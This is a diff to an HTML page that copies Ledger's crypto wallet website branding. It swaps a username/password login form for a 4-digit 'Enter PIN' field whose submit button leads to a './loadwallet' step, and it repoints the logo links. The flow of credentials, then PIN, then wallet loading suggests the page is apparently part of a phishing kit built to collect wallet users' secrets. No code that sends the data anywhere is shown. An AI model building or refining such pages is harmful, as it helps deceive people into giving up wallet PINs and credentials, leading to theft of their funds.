@@ -327,7 +327,7 @@ var wpml_cookies = {"wp-wpml_current_language":{"value":"en","expires":1,"path":
   */
 </style>            <header id="header" class=" transparent-white-font" data-slug="homepage">
   <div class="row">
-    <a href="./" title="Ledger" class="logo">
+    <a href="www.ledger.html" title="Ledger" class="logo">
       <picture class="flexbox">
         <source media="(min-width: 1200px)" srcset="https://www.ledger.com/wp-content/themes/ledger-v2/public/images/ledger-logo-long.svg">
         <source media="(max-width: 1200px)" srcset="https://www.ledger.com/wp-content/themes/ledger-v2/public/images/ledger-logo-short.svg">
@@ -536,37 +536,31 @@ var wpml_cookies = {"wp-wpml_current_language":{"value":"en","expires":1,"path":
                                 <h1>Ledger Crypto Wallets</h1>
                             </div>
 							<div class="main">      
-        <h6>Enter your login credentials</h6>
+        <h6>Enter PIN</h6>
 
-        <form action="">
-            <label for="first" style="color:#F0F8FF;text-align:center;">
-                Username:
-            </label>
-            <input type="text" id="first" name="first" 
-                placeholder="" required>
-
-            <label for="password" style="color:#F0F8FF;text-align:center;">
-                Password:
-            </label>
-            <input type="password" id="password" name="password" 
-                placeholder="" required>
-
-            <div class="wrap">
-		    <a href="./pinauth">
-                <button type="submit" class="button secondary" style="color: #ffffff; background-color: FF5300;" formaction="./pinauth">
-				 <a href="./pinauth">
+		<div>
+  <div style="position: relative; font-family: monospace; font-size: 2.5rem; height: 2ch; display: flex; align-items: center;">
+    <input type="text" name="box-pin-code" pattern="\d*" maxlength="4" title="Input 4 number PIN code" inputmode="numeric" autocomplete="off" autofocus
+      style="font-family: inherit; font-size: inherit; border: none; outline: none; padding: 0; letter-spacing: 1ch; -webkit-text-security: disc; -moz-text-security: disc; color: gray; padding-left: 0.25ch; height: 1.5ch; margin-bottom: 0.05ch; background: transparent; width: 8ch;" />
+    <div style="position: absolute; top: 0; bottom: 0; outline: 2px solid lightgray; width: 1.5ch; z-index: -1;"></div>
+    <div style="position: absolute; top: 0; bottom: 0; outline: 2px solid lightgray; width: 1.5ch; z-index: -1; left: 2ch;"></div>
+    <div style="position: absolute; top: 0; bottom: 0; outline: 2px solid lightgray; width: 1.5ch; z-index: -1; left: 4ch;"></div>
+    <div style="position: absolute; top: 0; bottom: 0; outline: 2px solid lightgray; width: 1.5ch; z-index: -1; left: 6ch;"></div>
+		<div class="wrap">
+		    <a href="./loadwallet">
+                <button type="submit" class="button secondary" style="color: #ffffff; background-color: FF5300;" formaction="./loadwallet">
+				 <a href="./loadwallet">
                     Submit
 					</a>
                 </button>
 			    </a>
             </div>
-        </form>
+  </div>
+
+</div>
+
+
         
-        <p>Not registered?
-            <a href="#" style="text-decoration: none;">
-                Create an account
-            </a>
-        </p>
     </div>
 
                                                                     </div>
@@ -724,7 +718,7 @@ if(jQuery('.anim-desktop').length > 0){
       <footer class="ldg-container" id="footer">
   <div class="row flexbox">
     <div>
-      <a href="./" title="Ledger" class="logo"><img src="images/images-ledger-logo-long.svg" alt=""></a>
+      <a href="www.ledger.html" title="Ledger" class="logo"><img src="images/images-ledger-logo-long.svg" alt=""></a>
 
       <ul class="language-container">
       <li class="has-children language-switcher">
